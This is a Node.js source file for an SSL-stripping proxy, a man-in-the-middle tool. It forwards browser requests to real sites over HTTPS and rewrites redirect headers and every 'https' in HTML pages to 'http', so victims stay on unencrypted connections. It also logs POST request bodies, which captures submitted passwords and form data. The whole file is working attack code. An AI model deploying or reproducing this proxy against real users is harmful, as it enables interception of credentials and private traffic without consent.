const http = require('http');
const https = require('https');
const url = require('url');
const zlib = require('zlib');

class SllStripProxy {

  constructor(port, logProxyReq) {
    this.port = port;
    this.logProxy = logProxyReq;
  }

	// Starts the proxy server
  start() {

    const server = http.createServer(this.handle.bind(this));

    server.listen(this.port, () => {
      console.log('SslStrip Proxy Service running on port ', this.port);
    });
  }

	// Handles all proxypassed requests
  handle(req, res) {
		// create proxy request options
    const options = this.getOptions(req);

    var proxyReq = https.request(options, (proxyRes) => {
      if (this.logProxy) {
        console.log('statusCode:', proxyRes.statusCode);
        console.log('headers:', proxyRes.headers); 
      }

			// change server response location
      let location = proxyRes.headers.location;
      if (location && location.includes('https')) {
        location = location.replace('https', 'http');
				proxyRes.headers.location = location;
      }

      const cntType = proxyRes.headers['content-type'];
      if (proxyRes.headers['content-type'] && cntType.includes('html')) {
        // Strip all https links from html content
        this.stripHTML(proxyRes, res);
      } else {
				// Return server response with changed location
				proxyRes.pipe(res);
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
      }

    });
    
    proxyReq.on('error', e => {
      if (this.logProxy) {
        console.error(e);
      }
    });
    
    req.pipe(proxyReq);
    req.on('data', chunk => {
			const currentLog = chunk.toString();
      if (currentLog && currentLog.length < 1000) {
				console.log('POST:', chunk.toString());
			}
    });
  }

	// returns https request options from client request
  getOptions(request) {
    const hostInfo = request.headers.host.split(':');
    const path = request.headers.path || url.parse(request.url).path;
    const protocol = 'https:';
    if (request.method === 'POST') {
      request.headers['X-Requested-With'] = 'XMLHttpRequest';
      request.headers['accept'] = 'application/json';
    }
    return {
      host: hostInfo[0],
      port: hostInfo[1] || 443,
      protocol,
      path,
      method: request.method,
      headers: request.headers,
    };
  }


  // Strips all https links in the html response
  stripHTML(remoteResponse, response) {
    
    delete remoteResponse.headers['content-length'];
		response.writeHead(remoteResponse.statusCode, remoteResponse.headers);
		let body = '';
		
    // Unzip the content if needed
    if (remoteResponse.headers['content-encoding'] === 'gzip') {
			let inputStream;
      inputStream = zlib.createGunzip();
      remoteResponse.pipe(inputStream);
      inputStream.on('data', chunk => {
        body += chunk.toString('utf-8');
			});
			
      inputStream.on('end', () => {
				let buf = Buffer.from(this.fixBody(body), 'utf-8');
				
        // Compress again so the browser can handle it
        zlib.gzip(buf, (err, result) => {
          response.end(result);
        });
      });
    } else {
      remoteResponse.on('data', chunk => {
        body += chunk.toString('utf-8');
      });
      remoteResponse.on('end', () => {
        let html = this.fixBody(body);
        response.end(html);
      });
    }
	}
	
	// replace all 'https' with 'http' in body string
	fixBody(body) {
		return body.replace(/https/g, 'http');
	} 
}

const proxy = new SllStripProxy(process.env.npm_config_port || 8080, false);
proxy.start();